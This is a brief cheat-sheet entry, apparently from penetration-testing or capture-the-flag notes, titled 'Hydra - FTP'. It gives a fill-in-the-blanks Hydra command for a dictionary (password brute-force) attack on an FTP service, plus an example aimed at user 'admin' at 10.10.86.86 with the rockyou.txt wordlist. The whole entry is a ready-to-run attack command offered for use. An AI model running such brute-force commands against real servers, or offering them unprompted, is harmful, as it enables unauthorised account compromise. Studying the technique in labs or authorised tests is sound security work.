# Hydra - FTP

*********************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket charactors themselves [ ] require removal. See examples.
*********************************************************************************

### FTP Dictinary Attack:
```
hydra -l [USERNAME] -P [WORDLIST-PATH] ftp://[TARGET-IP]
```
Example:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.10.86.86
```
